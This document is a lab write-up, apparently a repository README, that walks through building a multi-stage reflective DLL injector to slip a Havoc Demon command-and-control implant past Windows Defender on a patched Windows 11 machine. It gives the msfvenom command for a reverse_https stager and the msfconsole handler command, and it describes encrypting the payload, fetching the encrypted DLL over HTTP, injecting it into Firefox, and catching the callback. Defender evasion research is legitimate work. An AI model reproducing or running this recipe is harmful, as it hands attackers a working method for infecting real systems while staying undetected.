# Evading Defender with Havoc Demon Agent via Multi-Stage Reflective DLL Injector

<img src=data/demon.png align=center><img/>

## About the Lab

The purpose of this lab is to bypass Windows Defender on a fully patched Windows 11 device. I've written several development tools for creating evasive loaders which ive wanted to use for a public project. This is a fun way to do so.

> [!NOTE]
> This lab tested the standard version of Windows Defender included with all installations of Windows 11, not Microsoft Defender for Endpoint.

## The Payload

### About
This is a payload that i wrote as a proof of concept for other tools that i've written. The goal was to slip an implant past defender using a loader which implements evasive tactics using code generated from tools that i have previously released. Both the dll and implant perform their injection routines through system calls generated with the [wizardcalls](https://github.com/wizardy0ga/wizardcalls) tool. Dynamic API resolution via API hashing were implemented in the injector & dll via the [hashycalls](https://github.com/wizardy0ga/hashycalls) tool. Finally, both programs use [shell-crypt](https://github.com/wizardy0ga/shell-crypt) to obfuscate payloads & perform run-time decryption.

The payload operates in 3 main stages. First, the injector will establish a connection with a webserver & retrieve an encrypted dll. Then, the injector decrypts the dll and reflectively loads it into firefox to initiate the second stage. From the address space of firefox, the dll will decrypt & execute an embedded metasploit stager to launch the third stage. In the third and final stage, the metasploit stager retrieves & executes the demon shellcode. At this point, demon is now executing in memory on the system & is ready to receive commands from the adversary.

### Kill Chain
<img src=data/killchain.png align=center><img/>

### How it Works

#### Stage 0
The initial payload is an injector intended to be executed by the user / victim.

#### Stage 1
The injector downloads the and decrypts the reflective dll. The dll is reflectively injected into firefox.

#### Stage 2
An embedded msfvenem custom shellcode stager is decrypted and executed. 

#### Stage 3
The shellcode downloads & executes the demon shellcode within the address space of firefox. Pwnd!

#### MITRE TTPs Employed
| Tactic | Technique | ID |
| - | - | - |
| Execution | Native API | [T1106](https://attack.mitre.org/techniques/T1106/)
| Defense Evasion | Obfuscated Files or Information: Embedded Payloads | [T1027.009](https://attack.mitre.org/techniques/T1027/009/)
| Defense Evasion | Obfuscated Files or Information: Encrypted/Encoded File | [T1027.013](https://attack.mitre.org/techniques/T1027/013/)
| Defense Evasion | Obfuscated Files or Information: Dynamic API Resolution | [T1027.007](https://attack.mitre.org/techniques/T1027/007/)
| Defense Evasion | Reflective Code Loading | [T1620](https://attack.mitre.org/techniques/T1620/)
| Defense Evasion | Process Injection | [T1055](https://attack.mitre.org/techniques/T1055/)
| Command and Control | Ingress Tool Transfer |[T1105](https://attack.mitre.org/techniques/T1105/)

### Interesting Development Issues
<details>
    <summary> Expand </summary>

While developing this payload, i ran into some issues that i wanted to highlight here for future reference.

#### Demon Shellcode Size
The size of the shellcode output by demon is fairly large, at ~100 KB using the default payload. Embedding this directly in the payload would make management & compilation some what of a hassle. To resolve this issue, a stager was inserted between the dll & demon shellcode allowing a smaller shellcode to be embedded within the dll which would download & execute a much larger shellcode.

#### Conflicts between tools
I noticed that using both hashycalls & wizardcalls in the same payload required some adjustments to be made to the source code, specifically around the macros used for hashing. This will be resolved in a future update to prevent naming collisions between macros. There were some other conflicts as well but i don't remember them at this time. They will be diagnosed & resolved in future updates.

#### Wizardcalls Global Architecture Issue
Wizardcalls operates using global variables. While incorporating this tool into the reflective dll, i had to remove this dependency on global variables since the reflective injection function in the dll must be position independent. I intend to add this as a feature to the tool in a future update. 

</details>

## The Lab

### Machine Info

###### Attacker
| IP | Description
| - | - |
| 172.16.1.6 | A server which hosts the encrypted dll
| 172.16.1.5 | The havoc command and control server

###### Victim
| IP | Description
| - | - |
| 172.16.1.9 | A fully patched windows 11 system

### Setting up Havoc
> [!IMPORTANT]
> Havocs installation is out of scope for this lab. Refer to havocs documentation [here](https://havocframework.com/docs/installation) for installation instructions.
<details>
    <summary> Expand </summary>

The first step is to create a listener. I've used the default configuration HTTPS payload for simplicity sake. 

<img src=data/listener_interface.png align=center><img/>
###### Creating a Listener

Next we need to generate our shellcode. Again, for simplicity i've used the default configuration.

<img src=data/payload_generator.png align=center><img/>
###### Generating the Shellcode

</details>

### Setting up Metasploit
<details>
    <summary> Expand </summary>

In this instance, metasploit will stage the demon shellcode. Metasploit offers a various stagers under **windows/x64/custom/** which download & execute larger shellcodes. This is useful for instances where the primary shellcode is too large to efficiently embed within an executable. A stager solves this issue. To generate the stager, execute this msfvenom command:  

`msfvenom -p windows/x64/custom/reverse_https lhost=eth0 lport=80 shellcode_file=/home/kali/shellcodes/demon.x64.bin exitfunc=thread -o stager.bin`

Save this shellcode as it will be embedded in the reflective dll.

<img src=data/msfvenom.png align=center><img/>
###### Generating the stager shellcode

Now it's time to setup a metasploit listener for the stager. This is done through the command below.

`msfconsole -q -x "use multi/handler;set payload windows/x64/custom/reverse_https;set lhost eth0; set lport 80; set shellcode_file /home/kali/shellcodes/demon.x64.bin; set exitonsession false; run -j"`

<img src=data/stager_listener.png align=center><img/>
###### Setting up the listener

</details>

### Building the Injector & DLL
<details>
    <summary> Expand </summary>

It's time to build the dll & injector. First, we'll need to encrypt & embed our shellcode in the dll, then we'll compile it. Next, we'll encrypt the dll & embed the decryption info in the injector.

First, we download our shellcode from the kali machine. Then, we encrypt the shellcode using [shell-crypt](https://github.com/wizardy0ga/shell-crypt). Shell-crypt is a utility i wrote for obfuscating shellcode in C/C++ implants. It encrypts the shellcode & then encrypts the decryption key using XOR. The key will bruteforce itself at run time prior to decrypting the shellcode. This protects both the shellcode & the key.

<img src=data/encrypting_the_stager.png align=center><img/>
###### Encrypting the Stager

Once the shellcode is encrypted, we place the **HintByte**, **Key** & **shellcode** variables into the **Payload** function of the dllmain.c file in the dll.

<img src=data/embed_stager.png align=center><img/>
###### Embedding the stager in the DLL

Now we compile the DLL with our encrypted stager embedded inside.

<img src=data/compile_dll.png align=center><img/>
###### Compiling the DLL in Visual Studio

Now we need to encrypt the DLL & store the decryption info in the injector. We'll encrypt the DLL with the [shell-crypt](https://github.com/wizardy0ga/shell-crypt) utility. 

<img src=data/encrypt_dll.png align=center><img/>
###### Encrypting the DLL

Move the encrypted dll file into a webserver. In this case, i'm hosting a webserver within the release directory of the solution. The injector will connect to this server & retrieve the encrypted DLL.

<img src=data/http_server.png align=center><img/>
###### Starting a webserver to host the DLL

Copy the webserver ip & dll name into the respective macros in the injectors main.c file.  

<img src=data/webserver_info.png>  

###### Setting up the webserver info in the injector  

Copy the **HintByte** & **Key** variables output by shellcrypt to the main.c file of the Injector.

<img src=data/embed_injector.png align=center><img/>
###### Embedding DLL decryption info in the Injector

We're ready to compile the injector! Once the injector is compiled, we'll move over to the victim machine.

<img src=data/compile_injector.png align=center><img/>
###### Compiling the injector.

</details>


### Verifying the Victim Machine Information
<details>
    <summary> Expand </summary>

The victim machine is a fully patched Windows 11 device. Below is an image from the [windows 11 update history](https://support.microsoft.com/en-us/topic/windows-11-version-24h2-update-history-0929c747-1815-4543-8461-0160d16f15e5) provided by Microsoft. The latest version of Windows 11 24H2 at this time of writing is 26100.3775.

<img src=data/update_history.png align=center><img/>
###### Latest Windows 11 Build Version

On our victim, we can verify we're running the latest build version at this time of writing.

<img src=data/victim_version_info.png align=center><img/>
###### About section from the Victim machine

We'll also want to verify we have the latest defender updates installed. Microsoft lists the latest versions for defender components [here](https://www.microsoft.com/en-us/wdsi/defenderupdates)

<img src=data/defender_version_info.png align=center><img/>
###### Latest Security Intelligence Version

On our victim, we can verify the latest updates installed for the security intelligence, engine & antimalware client. 

<img src=data/defender_version_on_victim.png align=center><img/>
###### Security Intelligence Update Version on Victim

</details>

### Executing the Injector
<details>
    <summary> Expand </summary>

Finally, it's time to fire the missle! First, we'll perform a signature scan on our injector which has been given the name **goodnight.exe**. 

<img src=data/signature_scan.png align=center><img/>
###### Performing a file scan for signature based threats

Great, no detections! This executable doesn't contain any signatures which are known threats. This means we can move into the execution phase.

<img src=data/victim_exec.png align=center><img/>
###### Executing the injector on the victim

<img src=data/no_exclusions.png align=center><img/>
###### Verifying no defender exclusions exist on the victim

Awesome! The injector successfully retrieved & decrypted the dll which was reflectively loaded into firefox using the pid 3664. The DLL then decrypted the embedded metasploit stager which retrieved the the demon shellcode & executed it in the address space of firefox. Using powershell, we can verify firefox has established a connection with our command and control server at 172.16.1.5. The output of our web server & stage listener also show the victim retrieving each payload.

<img src=data/web_request.png align=center><img/>
###### Retrieving the encrypted dll from the webserver

<img src=data/stager_listener_request.png align=center><img/>
###### Retrieving the demon shellcode from the stager listener

Back on the c2, we can verify we've caught the callback from the demon agent. A powershell command is executed to query the AntiVirusProduct CIM class to enumerate the AV product running on the system.

<img src=data/catching_shell.png align=center><img/>
###### Catching the Callback from Demon Agent

There it is. The havoc demon agent has evaded defender on a Windows 11 device that was fully patched at this time of writing.

</details>